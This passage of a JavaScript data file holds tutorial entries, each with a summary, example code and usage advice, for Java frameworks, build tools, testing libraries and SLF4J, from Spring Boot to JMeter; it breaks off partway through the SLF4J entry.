      title: "Example 1: A REST endpoint in Spring Boot",
      description: "<p>Minimal, production-ready web API.</p>",
      code: "@RestController\nclass HelloController {\n  @GetMapping(\"/hello\")\n  String hello() { return \"Hello\"; }\n}\n@SpringBootApplication\nclass App { public static void main(String[] a){ SpringApplication.run(App.class,a); } }"
    },
    {
      title: "Example 2: DI + layered structure",
      description: "<p>Constructor injection across layers.</p>",
      code: "@Service\nclass OrderService {\n  private final OrderRepository repo;\n  OrderService(OrderRepository repo) { this.repo = repo; } // injected\n}\ninterface OrderRepository extends JpaRepository<Order, Long> {}"
    },
    {
      title: "Example 3: a REST endpoint in a few lines",
      description: "<p>Auto-configuration plus annotations get a working HTTP endpoint with almost no boilerplate.</p>",
      code: "@RestController\n" +
        "class HelloController {\n" +
        "  @GetMapping(\"/hello/{name}\")\n" +
        "  String hello(@PathVariable String name) { return \"Hi \" + name; }\n" +
        "}\n" +
        "// @SpringBootApplication + an embedded Tomcat = run with `java -jar app.jar`."
    },
    {
      title: "Example 4 (edge case): component scanning and startup cost",
      description: "<p>Beans are only found under the main class's package; and 'magic' auto-config can slow startup or wire something unexpected.</p>",
      code: "// If @SpringBootApplication is in com.acme.app, a @Component in com.other\n" +
        "// is NOT scanned -> 'No qualifying bean' at runtime.\n" +
        "// Fix: move it under the base package or add @ComponentScan(\"com.other\").\n" +
        "//\n" +
        "// Auto-config pulls in a lot; use 'spring.main.lazy-initialization' or trim\n" +
        "// starters if startup time matters (or consider Quarkus/native image)."
    }
  ],
  whenToUse: "<p>Use Spring Boot for essentially any Java backend &mdash; REST APIs, microservices, web apps, " +
    "batch jobs. Its productivity, ecosystem, and maturity are unmatched in the Java world. " +
    "<strong>Gotchas:</strong> the 'magic' of auto-configuration is great until something behaves unexpectedly " +
    "and you don't know which default kicked in (use <code>--debug</code>, understand what Boot configures). " +
    "It pulls in many dependencies and has non-trivial startup time/memory (matters for serverless cold " +
    "starts &mdash; lighter frameworks like Quarkus compete there). Learn the core (DI, MVC, Data, " +
    "auto-config) rather than copy-pasting. There's a dedicated Spring Boot roadmap for depth.</p>"
};

C["quarkus"] = {
  summary: "<p><strong>Quarkus</strong> is a modern, Kubernetes-native Java framework optimized for fast " +
    "startup, low memory, and especially <strong>GraalVM native compilation</strong> &mdash; making Java " +
    "competitive for serverless and containerized cloud-native workloads. It offers a Spring-like developer " +
    "experience (DI, REST, data, reactive) with live reload and a focus on cloud efficiency.</p>",
  examples: [
    {
      title: "Example 1: A Quarkus REST endpoint",
      description: "<p>JAX-RS style, fast startup.</p>",
      code: "@Path(\"/hello\")\npublic class HelloResource {\n  @GET\n  public String hello() { return \"Hello from Quarkus\"; }\n}"
    },
    {
      title: "Example 2: Native image advantage",
      description: "<p>Compile to a native binary for tiny footprint.</p>",
      code: "// Build a native executable (GraalVM):\n//   ./mvnw package -Pnative\n// Result: ~tens of ms startup, ~tens of MB memory\n//   -> excellent for serverless / scale-to-zero / containers"
    },
    {
      title: "Example 3: a Quarkus REST resource (JAX-RS style)",
      description: "<p>Quarkus uses standard MicroProfile/JAX-RS annotations and does heavy lifting at build time.</p>",
      code: "@Path(\"/hello\")\n" +
        "public class GreetingResource {\n" +
        "  @GET @Path(\"/{name}\")\n" +
        "  public String hello(@PathParam(\"name\") String name) { return \"Hi \" + name; }\n" +
        "}\n" +
        "// `./mvnw quarkus:dev` gives live reload; build a native image with -Pnative."
    },
    {
      title: "Example 4 (edge case): native image reflection config",
      description: "<p>GraalVM native images do ahead-of-time compilation, so anything using runtime reflection must be registered or it fails only in the native build.</p>",
      code: "// Works on the JVM, fails in native unless registered:\n" +
        "@RegisterForReflection\n" +
        "class MyDto { /* fields used reflectively by serialization */ }\n" +
        "// Quarkus extensions handle most of this, but third-party libs may need\n" +
        "// explicit reflect-config.json. Bugs often appear ONLY in the native build."
    }
  ],
  whenToUse: "<p>Choose Quarkus for cloud-native, serverless, or container workloads where <strong>fast startup " +
    "and low memory</strong> matter (functions, scale-to-zero, dense Kubernetes deployments), or when you want " +
    "GraalVM native images. <strong>Gotchas:</strong> native compilation has constraints (reflection needs " +
    "configuration, longer build times, some libraries need adaptation) and a smaller ecosystem than Spring. " +
    "The reactive model adds complexity if you don't need it. For traditional long-running services, Spring " +
    "Boot's maturity and ecosystem often win. Quarkus shines specifically where JVM startup/memory cost is a " +
    "real constraint &mdash; pick it for that, not by default.</p>"
};

C["play-framework"] = {
  summary: "<p><strong>Play Framework</strong> is a reactive, stateless, full-stack web framework for Java " +
    "(and Scala) built on Akka. It emphasizes a non-blocking, asynchronous architecture for high throughput, " +
    "hot-reload developer productivity, and a convention-over-configuration MVC structure. It's well-suited to " +
    "reactive, real-time, and high-concurrency web applications.</p>",
  examples: [
    {
      title: "Example 1: A Play controller (conceptual)",
      description: "<p>Action-based, can return async results.</p>",
      code: "public class HomeController extends Controller {\n  public Result index() {\n    return ok(\"Hello from Play\");\n  }\n  public CompletionStage<Result> async() {   // non-blocking\n    return fetchData().thenApply(data -> ok(data));\n  }\n}"
    },
    {
      title: "Example 2: Reactive/async strength",
      description: "<p>Non-blocking by design for high concurrency.</p>",
      code: "// Play is built on a non-blocking, reactive model (Akka).\n// Async actions return CompletionStage<Result> -> handle many\n//   concurrent requests with few threads."
    },
    {
      title: "Example 3: a non-blocking Play action",
      description: "<p>Play actions return a <code>Result</code> (or <code>CompletionStage&lt;Result&gt;</code>) and route via a routes file.</p>",
      code: "public class HomeController extends Controller {\n" +
        "  public CompletionStage<Result> index() {\n" +
        "    return service.loadAsync()                 // non-blocking\n" +
        "        .thenApply(data -> ok(views.html.index.render(data)));\n" +
        "  }\n" +
        "}\n" +
        "// conf/routes:  GET  /   controllers.HomeController.index()"
    },
    {
      title: "Example 4 (edge case): blocking inside an async action starves the pool",
      description: "<p>Play's default execution context is small; a blocking JDBC call inside an async action exhausts it and tanks throughput.</p>",
      code: "// BAD: blocking call on the default (rendering) dispatcher\n" +
        "public Result bad() { return ok(jdbc.querySync()); }\n" +
        "\n" +
        "// Run blocking work on a dedicated dispatcher / CompletableFuture pool instead.\n" +
        "// Also: Play's stack and conventions differ from Spring - smaller talent pool."
    }
  ],
  whenToUse: "<p>Consider Play for reactive, high-concurrency, or real-time web apps, or in Scala/mixed shops " +
    "(it's first-class in both). Its async model and hot reload appeal for certain workloads. " +
    "<strong>Gotchas:</strong> in the Java ecosystem, Play has a <strong>much smaller community</strong> than " +
    "Spring Boot (fewer resources, hires, integrations) and a steeper, reactive-flavored learning curve. Its " +
    "Scala roots show in some APIs. For most Java teams, Spring Boot (or Quarkus for cloud-native) is the more " +
    "pragmatic choice with broader support. Pick Play when its reactive model and Scala affinity are genuine " +
    "advantages for your project.</p>"
};

C["javalin"] = {
  summary: "<p><strong>Javalin</strong> is a lightweight, simple web framework for Java and Kotlin, designed " +
    "to be unopinionated and easy to learn, with minimal boilerplate. It's not a full-stack framework &mdash; " +
    "it focuses on being a thin, fast layer for building REST APIs and small web services, with a simple " +
    "lambda-based handler API.</p>",
  examples: [
    {
      title: "Example 1: A Javalin app in a few lines",
      description: "<p>Minimal setup, lambda handlers.</p>",
      code: "var app = Javalin.create().start(7070);\napp.get(\"/hello\", ctx -> ctx.result(\"Hello\"));\napp.post(\"/users\", ctx -> {\n  var user = ctx.bodyAsClass(User.class);\n  ctx.status(201).json(user);\n});"
    },
    {
      title: "Example 2: Lightweight vs full framework",
      description: "<p>Thin layer, you assemble what you need.</p>",
      code: "// Javalin gives routing + request/response handling.\n// You add only the libraries you want (JSON, DI, DB) -\n//   no large opinionated stack imposed."
    },
    {
      title: "Example 3: a minimal Javalin app",
      description: "<p>Javalin is code-first and explicit - no annotations or component scanning, just register handlers.</p>",
      code: "var app = Javalin.create().start(7070);\n" +
        "app.get(\"/hello/{name}\", ctx -> ctx.result(\"Hi \" + ctx.pathParam(\"name\")));\n" +
        "app.post(\"/users\", ctx -> {\n" +
        "  User u = ctx.bodyAsClass(User.class);\n" +
        "  ctx.status(201).json(create(u));\n" +
        "});"
    },
    {
      title: "Example 4 (edge case): you wire up what Spring Boot gives for free",
      description: "<p>The flip side of minimalism - DI, validation, security, metrics, and config are your responsibility (libraries or hand-rolled).</p>",
      code: "// No built-in DI: you construct and pass dependencies yourself.\n" +
        "var repo = new UserRepo(dataSource);\n" +
        "var app = Javalin.create();\n" +
        "app.get(\"/users\", ctx -> ctx.json(repo.all())); // you own the wiring\n" +
        "// Great for small/edge services; for a large app the missing batteries add up."
    }
  ],
  whenToUse: "<p>Choose Javalin for small services, microservices, prototypes, or when you want a simple, " +
    "lightweight framework without Spring's weight and learning curve &mdash; especially if you value " +
    "minimalism and fast startup, or work in Kotlin. <strong>Gotchas:</strong> being lightweight means it " +
    "provides less out of the box &mdash; you assemble DI, data access, security, etc. yourself, which is more " +
    "work as the app grows. Its ecosystem is far smaller than Spring's. For large, feature-rich applications " +
    "needing a full ecosystem, Spring Boot is usually better. Javalin is ideal when you want just enough " +
    "framework and nothing more.</p>"
};

/* ===================== BUILD TOOLS ===================== */

C["maven"] = {
  summary: "<p><strong>Maven</strong> is the most widely-used Java build and dependency-management tool. It " +
    "uses a declarative XML config (<code>pom.xml</code>) describing dependencies, plugins, and a standard " +
    "build lifecycle (compile, test, package, install, deploy). It downloads dependencies from repositories " +
    "(Maven Central), enforces a standard project structure, and makes builds reproducible.</p>",
  examples: [
    {
      title: "Example 1: pom.xml dependencies",
      description: "<p>Declare dependencies; Maven fetches them transitively.</p>",
      code: "<dependencies>\n  <dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-web</artifactId>\n  </dependency>\n</dependencies>\n<!-- Maven resolves transitive deps + versions automatically -->"
    },
    {
      title: "Example 2: Lifecycle commands",
      description: "<p>Standard build phases.</p>",
      code: "mvn compile       # compile source\nmvn test          # run tests\nmvn package       # build a jar/war\nmvn install       # install to local repo\nmvn clean package # clean then build"
    },
    {
      title: "Example 3: a dependency and the build lifecycle",
      description: "<p>Dependencies go in <code>pom.xml</code>; the lifecycle phases run in order (<code>validate &rarr; compile &rarr; test &rarr; package &rarr; install</code>).</p>",
      code: "<!-- pom.xml -->\n" +
        "<dependency>\n" +
        "  <groupId>org.junit.jupiter</groupId>\n" +
        "  <artifactId>junit-jupiter</artifactId>\n" +
        "  <version>5.10.2</version>\n" +
        "  <scope>test</scope>           <!-- only on the test classpath -->\n" +
        "</dependency>\n" +
        "<!-- mvn package runs validate->compile->test->package automatically -->"
    },
    {
      title: "Example 4 (edge case): transitive dependency conflicts",
      description: "<p>Two libraries pulling different versions of the same dependency cause runtime errors; <code>mvn dependency:tree</code> diagnoses it.</p>",
      code: "# See who brings in which version:\n" +
        "mvn dependency:tree\n" +
        "\n" +
        "<!-- Pin the winner explicitly in <dependencyManagement> to resolve the clash. -->\n" +
        "<!-- Symptom: NoSuchMethodError / NoClassDefFoundError at runtime despite a\n" +
        "     clean compile - classic 'JAR hell' from a transitive version mismatch. -->"
    }
  ],
  whenToUse: "<p>Use Maven for most Java projects &mdash; it's the standard, with massive tooling/IDE support " +
    "and a huge plugin ecosystem. Its conventions make any Maven project familiar. <strong>Gotchas:</strong> " +
    "the XML can get verbose and the build lifecycle is rigid (less flexible than Gradle for custom logic). " +
    "Transitive dependency conflicts ('dependency hell') happen &mdash; use <code>mvn dependency:tree</code> " +
    "to diagnose and <code>&lt;dependencyManagement&gt;</code>/BOMs to align versions. Commit a consistent " +
    "build and use a wrapper for reproducibility. Maven vs Gradle is largely preference; Maven favors " +
    "convention and simplicity, Gradle flexibility and speed.</p>"
};

C["gradle"] = {
  summary: "<p><strong>Gradle</strong> is a powerful, flexible build tool using a Groovy or Kotlin DSL (not " +
    "XML) for build scripts. It offers incremental builds, a build cache, and a rich plugin system, making it " +
    "faster and more customizable than Maven for complex builds. It's the default for Android and popular for " +
    "large/multi-module Java projects.</p>",
  examples: [
    {
      title: "Example 1: build.gradle dependencies",
      description: "<p>Concise DSL instead of XML.</p>",
      code: "// build.gradle.kts (Kotlin DSL)\ndependencies {\n  implementation(\"org.springframework.boot:spring-boot-starter-web\")\n  testImplementation(\"org.junit.jupiter:junit-jupiter\")\n}"
    },
    {
      title: "Example 2: Tasks and custom logic",
      description: "<p>Programmable builds.</p>",
      code: "// Run tasks:\n//   ./gradlew build      # compile + test + package\n//   ./gradlew test\n// Custom task (real code, not just config):\ntasks.register(\"hello\") { doLast { println(\"Hi\") } }"
    },
    {
      title: "Example 3: a concise build.gradle(.kts)",
      description: "<p>Gradle uses a Groovy/Kotlin DSL - more flexible and far less verbose than XML.</p>",
      code: "plugins { id(\"java\") }\n" +
        "repositories { mavenCentral() }\n" +
        "dependencies {\n" +
        "  implementation(\"com.google.guava:guava:33.0.0-jre\")\n" +
        "  testImplementation(\"org.junit.jupiter:junit-jupiter:5.10.2\")\n" +
        "}\n" +
        "// ./gradlew build  - incremental and cached by default"
    },
    {
      title: "Example 4 (edge case): the build script is code - and that's a double-edged sword",
      description: "<p>Imperative build logic is powerful but can become unmaintainable; and the long-lived Gradle daemon occasionally needs clearing.</p>",
      code: "# Flaky/stale build? Stop the daemon and rebuild clean:\n" +
        "./gradlew --stop\n" +
        "./gradlew clean build --no-daemon\n" +
        "\n" +
        "// Avoid arbitrary logic in configuration phase (slows every build); prefer\n" +
        "// declarative plugins. 'implementation' vs 'api' controls dependency leakage\n" +
        "// to consumers - using 'api' everywhere defeats Gradle's faster incremental builds."
    }
  ],
  whenToUse: "<p>Use Gradle for complex, multi-module, or performance-sensitive builds, Android projects, or " +
    "when you need custom build logic &mdash; its incremental builds and caching make large builds faster than " +
    "Maven. <strong>Gotchas:</strong> the flexibility (build scripts are real code) is double-edged &mdash; " +
    "builds can become complex and hard to understand/maintain; keep them disciplined. Steeper learning curve " +
    "than Maven, and Groovy vs Kotlin DSL adds a choice. Always commit the <strong>Gradle wrapper</strong> " +
    "(<code>gradlew</code>) for reproducible builds across machines. For simple projects, Maven's convention " +
    "may be easier. Both are excellent; the choice is largely team preference.</p>"
};

C["bazel"] = {
  summary: "<p><strong>Bazel</strong> is Google's build tool designed for very large, multi-language " +
    "<strong>monorepos</strong>. It emphasizes reproducible, hermetic builds, fine-grained incrementality, " +
    "and aggressive caching (local and remote) plus distributed execution &mdash; enabling fast builds at " +
    "massive scale across many languages (Java, C++, Go, etc.) in one repository.</p>",
  examples: [
    {
      title: "Example 1: A BUILD file target",
      description: "<p>Declare libraries/binaries with explicit deps.</p>",
      code: "# BUILD\njava_binary(\n    name = \"app\",\n    srcs = glob([\"*.java\"]),\n    deps = [\"//lib:utils\"],   # explicit, fine-grained dependencies\n)"
    },
    {
      title: "Example 2: Scale + caching strength",
      description: "<p>Only rebuild what changed; cache the rest.</p>",
      code: "// Bazel rebuilds ONLY affected targets (fine-grained graph)\n//   + reuses cached build outputs (local + remote)\n//   + can distribute the build across machines\n// -> fast builds even in huge monorepos."
    },
    {
      title: "Example 3: explicit targets in a BUILD file",
      description: "<p>Bazel requires you to declare each target's sources and dependencies explicitly - which is what enables precise, cacheable, incremental builds.</p>",
      code: "# BUILD\n" +
        "java_library(\n" +
        "    name = \"orders\",\n" +
        "    srcs = glob([\"src/main/java/orders/*.java\"]),\n" +
        "    deps = [\"//common:util\"],   # explicit, fine-grained dependency\n" +
        ")\n" +
        "# bazel build //orders:orders - rebuilds ONLY what changed, hermetically."
    },
    {
      title: "Example 4 (edge case): steep cost for small/standard projects",
      description: "<p>Bazel's hermeticity and explicit deps are overkill for a typical app - the BUILD-file maintenance and ecosystem gaps outweigh the gains below monorepo scale.</p>",
      code: "# Every new dependency must be declared/pinned; IDE and library integration\n" +
        "# is weaker than Maven/Gradle. Migrating an existing Maven app is significant.\n" +
        "#\n" +
        "# Rule of thumb: choose Bazel for multi-language monorepos and remote-cache\n" +
        "# CI at org scale; for a single Spring Boot service, Maven/Gradle is simpler."
    }
  ],
  whenToUse: "<p>Use Bazel for <strong>large monorepos</strong>, multi-language codebases, and organizations " +
    "needing reproducible, scalable, distributed builds (Google-scale problems). Its incrementality and " +
    "caching shine when build times are a real bottleneck. <strong>Gotchas:</strong> Bazel has a " +
    "<strong>steep learning curve</strong> and significant setup/maintenance overhead, and a smaller Java " +
    "ecosystem fit than Maven/Gradle (many Java libraries assume Maven/Gradle). For typical single-project " +
    "Java apps, it's overkill &mdash; Maven or Gradle is far simpler. Choose Bazel specifically when monorepo " +
    "scale, hermeticity, and multi-language builds justify the complexity; otherwise stick with the standard " +
    "Java tools.</p>"
};

/* ===================== TESTING ===================== */

C["junit"] = {
  summary: "<p><strong>JUnit</strong> is the standard Java unit-testing framework (JUnit 5 is current). You " +
    "write test methods annotated <code>@Test</code>, use assertions to verify behavior, and lifecycle hooks " +
    "(<code>@BeforeEach</code>, <code>@AfterEach</code>) for setup/teardown. It integrates with build tools " +
    "and IDEs and is the foundation of automated testing in Java.</p>",
  examples: [
    {
      title: "Example 1: A basic test",
      description: "<p>Arrange, act, assert.</p>",
      code: "import static org.junit.jupiter.api.Assertions.*;\nclass CalculatorTest {\n  @Test\n  void addsNumbers() {\n    int result = new Calculator().add(2, 3);   // act\n    assertEquals(5, result);                    // assert\n  }\n}"
    },
    {
      title: "Example 2: Lifecycle + parameterized tests",
      description: "<p>Setup hooks and data-driven tests.</p>",
      code: "@BeforeEach void setup() { /* runs before each test */ }\n\n@ParameterizedTest\n@ValueSource(ints = {2, 4, 6})\nvoid isEven(int n) { assertTrue(n % 2 == 0); }\n\n@Test void throwsOnBadInput() {\n  assertThrows(IllegalArgumentException.class, () -> svc.process(null));\n}"
    },
    {
      title: "Example 3: parameterized tests and assertThrows",
      description: "<p>JUnit 5 runs one test over many inputs and asserts on thrown exceptions.</p>",
      code: "@ParameterizedTest\n" +
        "@ValueSource(strings = {\"\", \" \", \"\\t\"})\n" +
        "void blankIsRejected(String input) {\n" +
        "  assertThrows(IllegalArgumentException.class, () -> validate(input));\n" +
        "}\n" +
        "\n" +
        "@Test void addsUp() { assertEquals(5, calc.add(2, 3)); }"
    },
    {
      title: "Example 4 (edge case): test isolation and the assertEquals argument order",
      description: "<p>Shared mutable static state leaks between tests; and JUnit's <code>assertEquals(expected, actual)</code> order matters for readable failure messages.</p>",
      code: "static List<String> cache = new ArrayList<>(); // leaks across tests!\n" +
        "// Use @BeforeEach to reset state, or avoid shared statics entirely.\n" +
        "\n" +
        "assertEquals(expected, actual); // CORRECT order\n" +
        "assertEquals(actual, expected); // message reads backwards: 'expected X but was Y'\n" +
        "// Each @Test should pass when run alone AND in any order (don't rely on order)."
    }
  ],
  whenToUse: "<p>Use JUnit for all unit testing &mdash; run on every commit/CI. Test business logic, edge " +
    "cases, and error handling, not just happy paths. <strong>Gotchas:</strong> keep tests <strong>fast and " +
    "independent</strong> (no shared mutable state, any order). Test one thing per test with clear names. " +
    "Don't over-mock (mocking everything tests nothing real). Use <code>@ParameterizedTest</code> for " +
    "data-driven cases instead of copy-paste. Combine with Mockito (mocking), AssertJ (fluent assertions), " +
    "and integration tests. A good test suite is your safety net for refactoring &mdash; invest in it.</p>"
};

C["testng"] = {
  summary: "<p><strong>TestNG</strong> is a testing framework (inspired by JUnit) with extra features for " +
    "more complex testing needs: flexible test configuration, built-in support for parallel test execution, " +
    "test groups, dependencies between tests, data providers for parameterized tests, and powerful " +
    "configuration annotations. It's popular for integration and end-to-end testing.</p>",
  examples: [
    {
      title: "Example 1: TestNG test with groups",
      description: "<p>Annotations and grouping.</p>",
      code: "import org.testng.annotations.*;\nimport static org.testng.Assert.*;\nclass ServiceTest {\n  @Test(groups = \"fast\")\n  void addsNumbers() { assertEquals(svc.add(2, 3), 5); }\n}\n// Run only certain groups; configure via testng.xml"
    },
    {
      title: "Example 2: Data providers + parallelism",
      description: "<p>Parameterized tests and parallel runs.</p>",
      code: "@DataProvider\nObject[][] data() { return new Object[][]{ {2,3,5}, {1,1,2} }; }\n@Test(dataProvider = \"data\")\nvoid adds(int a, int b, int sum) { assertEquals(svc.add(a,b), sum); }\n// TestNG can run tests in parallel out of the box."
    },
    {
      title: "Example 3: data providers and groups",
      description: "<p>TestNG's <code>@DataProvider</code> feeds parameterized runs, and <code>groups</code> let you select subsets (smoke, regression).</p>",
      code: "@DataProvider Object[][] ages() { return new Object[][]{{17,false},{18,true}}; }\n" +
        "\n" +
        "@Test(dataProvider = \"ages\", groups = \"smoke\")\n" +
        "void adult(int age, boolean expected) {\n" +
        "  assertEquals(isAdult(age), expected);\n" +
        "}\n" +
        "// Run a subset:  testng with <groups><run><include name=\"smoke\"/>"
    },
    {
      title: "Example 4 (edge case): dependent tests and parallel state",
      description: "<p>TestNG's <code>dependsOnMethods</code> creates ordering many consider an anti-pattern; and its built-in parallelism exposes shared-state bugs.</p>",
      code: "@Test void login() {}\n" +
        "@Test(dependsOnMethods = \"login\") void dashboard() {} // skipped if login fails\n" +
        "// Convenient, but couples tests; JUnit deliberately avoids easy ordering.\n" +
        "//\n" +
        "// parallel=\"methods\" runs tests concurrently - any shared @BeforeClass state\n" +
        "// or static field becomes a race. Most teams now default to JUnit 5."
    }
  ],
  whenToUse: "<p>Consider TestNG when you need its advanced features &mdash; built-in parallel execution, test " +
    "groups, inter-test dependencies, flexible configuration &mdash; often for integration/E2E suites. " +
    "<strong>Gotchas:</strong> JUnit 5 has closed much of the historical feature gap (parameterized tests, " +
    "parallel execution, dynamic tests), and JUnit has the larger ecosystem/community in modern Java &mdash; " +
    "so most new projects default to JUnit. TestNG's inter-test dependencies can make tests less independent " +
    "(a smell). Choose TestNG deliberately when its specific capabilities matter for your testing style; " +
    "otherwise JUnit is the mainstream choice.</p>"
};

C["rest-assured"] = {
  summary: "<p><strong>REST Assured</strong> is a Java library for testing REST APIs with a readable, fluent, " +
    "BDD-style (given/when/then) syntax. It simplifies sending HTTP requests and validating responses &mdash; " +
    "status codes, headers, and JSON/XML body content &mdash; making API integration tests concise and " +
    "expressive.</p>",
  examples: [
    {
      title: "Example 1: given/when/then API test",
      description: "<p>Fluent request + response validation.</p>",
      code: "given()\n  .header(\"Authorization\", \"Bearer token\")\n.when()\n  .get(\"/api/users/7\")\n.then()\n  .statusCode(200)\n  .body(\"name\", equalTo(\"Sam\"))     // JSON path assertion\n  .body(\"roles\", hasItem(\"admin\"));"
    },
    {
      title: "Example 2: POST with body validation",
      description: "<p>Send JSON, assert the created resource.</p>",
      code: "given()\n  .contentType(\"application/json\")\n  .body(\"{\\\"name\\\":\\\"Sam\\\"}\")\n.when()\n  .post(\"/api/users\")\n.then()\n  .statusCode(201)\n  .body(\"id\", notNullValue());"
    },
    {
      title: "Example 3: given/when/then fluent API test",
      description: "<p>REST Assured reads like a BDD spec - set up the request, fire it, assert on the response.</p>",
      code: "given()\n" +
        "  .contentType(\"application/json\")\n" +
        "  .body(\"{\\\"name\\\":\\\"Sam\\\"}\")\n" +
        ".when()\n" +
        "  .post(\"/users\")\n" +
        ".then()\n" +
        "  .statusCode(201)\n" +
        "  .body(\"id\", notNullValue())\n" +
        "  .body(\"name\", equalTo(\"Sam\"));"
    },
    {
      title: "Example 4 (edge case): it tests a running server, not your code in isolation",
      description: "<p>REST Assured needs a live endpoint, so failures may be environment/network issues, and tests are slower and flakier than unit tests.</p>",
      code: "RestAssured.baseURI = \"http://localhost:8080\"; // must actually be up\n" +
        "// In Spring, combine with @SpringBootTest(webEnvironment = RANDOM_PORT) so a\n" +
        "// real server starts for the test. Keep these as a thin integration layer\n" +
        "// ON TOP of fast unit tests - don't push all logic checks through HTTP."
    }
  ],
  whenToUse: "<p>Use REST Assured for integration/E2E testing of HTTP APIs &mdash; verifying real endpoints' " +
    "status, headers, and payloads end-to-end. It's far more readable than hand-coding HTTP clients + JSON " +
    "parsing in tests. <strong>Gotchas:</strong> these are <em>integration</em> tests (they hit a running app/" +
    "server), so they're slower than unit tests and need the app + test data set up &mdash; keep them fewer " +
    "than unit tests (test pyramid). Manage test data and environment carefully (use Testcontainers/test " +
    "profiles). Don't replace unit tests of business logic with API tests. Great for contract/smoke/" +
    "regression testing of your API surface.</p>"
};

C["jmeter"] = {
  summary: "<p><strong>Apache JMeter</strong> is a tool for <strong>load and performance testing</strong>. It " +
    "simulates many concurrent users hitting your application (HTTP APIs, databases, queues) and measures " +
    "response times, throughput, and error rates under load. It has a GUI for building test plans and can run " +
    "headless in CI for automated performance testing.</p>",
  examples: [
    {
      title: "Example 1: A load test plan (conceptual)",
      description: "<p>Simulate concurrent users and measure.</p>",
      code: "// JMeter test plan:\n//   Thread Group: 500 users, ramp-up 60s, loop 10x\n//   HTTP Request: GET /api/products\n//   Assertions: response < 500ms, status 200\n//   Listeners: aggregate report (throughput, p95/p99, errors)"
    },
    {
      title: "Example 2: Headless run in CI",
      description: "<p>Automate performance checks.</p>",
      code: "# Run without GUI (for CI/automation):\njmeter -n -t loadtest.jmx -l results.jtl\n# Fail the build if p95 latency or error rate exceeds a threshold."
    },
    {
      title: "Example 3: scripting a load test (CLI / non-GUI mode)",
      description: "<p>Run JMeter headless in CI; the GUI is for building the test plan, not executing it.</p>",
      code: "# Run a saved plan non-GUI (the GUI itself can't sustain high load):\n" +
        "jmeter -n -t loadtest.jmx -l results.jtl -e -o report/\n" +
        "#  -n non-GUI  -t plan  -l raw results  -e/-o generate HTML dashboard\n" +
        "# Define users/ramp-up in a Thread Group; assert p95 latency and error rate."
    },
    {
      title: "Example 4 (edge case): the load generator can be the bottleneck",
      description: "<p>Misleading results come from an undersized client, GUI-mode runs, or co-locating JMeter with the system under test.</p>",
      code: "# Symptoms of a client-side bottleneck (not the server):\n" +
        "#  - latency rises but server CPU is idle\n" +
        "#  - JMeter host CPU/heap maxed out\n" +
        "# Fixes: run -n (non-GUI), raise -Xmx, distribute across multiple injectors,\n" +
        "#        and NEVER run the generator on the same machine as the target."
    }
  ],
  whenToUse: "<p>Use JMeter to validate performance and capacity before release &mdash; finding bottlenecks, " +
    "verifying SLAs/SLOs under load, and catching performance regressions. Run it against staging with " +
    "realistic scenarios and data. <strong>Gotchas:</strong> build the GUI for designing plans but run " +
    "load tests <strong>headless</strong> (the GUI itself consumes resources and skews results). The load " +
    "generator must have enough capacity (and network) not to be the bottleneck. Test against a " +
    "production-like environment with realistic data/think-times, or results mislead. Measure percentiles " +
    "(p95/p99), not just averages. Alternatives like Gatling or k6 are also popular. Performance test " +
    "regularly, not just once.</p>"
};

C["cucumber-jvm"] = {
  summary: "<p><strong>Cucumber-JVM</strong> is a <strong>Behavior-Driven Development (BDD)</strong> testing " +
    "tool. You write executable specifications in plain-language <strong>Gherkin</strong> syntax " +
    "(Given/When/Then scenarios) that non-technical stakeholders can read, and back them with Java " +
    "<em>step definitions</em> that run the actual test logic. It bridges business requirements and automated " +
    "tests.</p>",
  examples: [
    {
      title: "Example 1: A Gherkin feature",
      description: "<p>Plain-language, executable scenario.</p>",
      code: "Feature: Withdraw money\n  Scenario: Sufficient funds\n    Given my balance is 100\n    When I withdraw 30\n    Then my balance should be 70"
    },
    {
      title: "Example 2: Java step definitions",
      description: "<p>Glue Gherkin steps to test code.</p>",
      code: "@Given(\"my balance is {int}\")\npublic void balanceIs(int b) { account = new Account(b); }\n@When(\"I withdraw {int}\")\npublic void withdraw(int a) { account.withdraw(a); }\n@Then(\"my balance should be {int}\")\npublic void check(int b) { assertEquals(b, account.balance()); }"
    },
    {
      title: "Example 3: a Gherkin scenario bound to step definitions",
      description: "<p>Plain-language <code>.feature</code> steps map to Java methods via regex/expressions.</p>",
      code: "# login.feature\n" +
        "Scenario: Successful login\n" +
        "  Given a registered user \"sam\"\n" +
        "  When they log in with the correct password\n" +
        "  Then they see the dashboard\n" +
        "\n" +
        "// Steps.java\n" +
        "@Given(\"a registered user {string}\")\n" +
        "public void registered(String name) { /* set up */ }"
    },
    {
      title: "Example 4 (edge case): the overhead only pays off with real collaboration",
      description: "<p>If non-technical stakeholders never read the features, Gherkin is just a slow, brittle indirection over plain JUnit.</p>",
      code: "// Anti-pattern: developers writing AND only reading the .feature files ->\n" +
        "// you've added a regex-binding layer for no collaboration benefit.\n" +
        "//\n" +
        "// Also: vague steps like 'When the user does stuff' defeat BDD. Keep steps\n" +
        "// reusable and declarative; avoid leaking UI/implementation detail into them."
    }
  ],
  whenToUse: "<p>Use Cucumber for BDD when collaboration with non-technical stakeholders (product, QA, business) " +
    "matters &mdash; the Gherkin scenarios serve as living, executable documentation of behavior. Good for " +
    "acceptance/feature testing. <strong>Gotchas:</strong> it adds an abstraction layer (Gherkin + step defs) " +
    "that's overhead if no non-technical reader actually uses the scenarios &mdash; then plain JUnit is " +
    "simpler. Step definitions can become tangled/duplicated without discipline. Don't use BDD for low-level " +
    "unit tests (too verbose). It pays off when business-readable specs genuinely drive collaboration; " +
    "otherwise the ceremony isn't worth it.</p>"
};

/* ===================== LOGGING FRAMEWORKS ===================== */

C["slf4j"] = {
  summary: "<p><strong>SLF4J (Simple Logging Facade for Java)</strong> is a logging <em>abstraction</em> &mdash; " +
    "an API, not an implementation. You code against SLF4J, and at runtime it binds to an actual logging " +
    "backend (Logback, Log4j2, etc.). This decouples your code from any specific logging framework, so you " +
    "(and libraries) can swap backends without changing code. It's the de-facto standard logging API in " +
    "Java.</p>",
  examples: [
    {
      title: "Example 1: Logging via the SLF4J API",
      description: "<p>Code against the facade; backend is pluggable.</p>",
      code: "import org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nclass OrderService {\n  private static final Logger log = LoggerFactory.getLogger(OrderService.class);\n  void place(Order o) {\n    log.info(\"placing order {}\", o.id());   // parameterized (efficient)\n    log.error(\"failed\", exception);\n  }\n}"
    },
    {
      title: "Example 2: Parameterized logging",
      description: "<p>Avoid string concatenation; use placeholders.</p>",
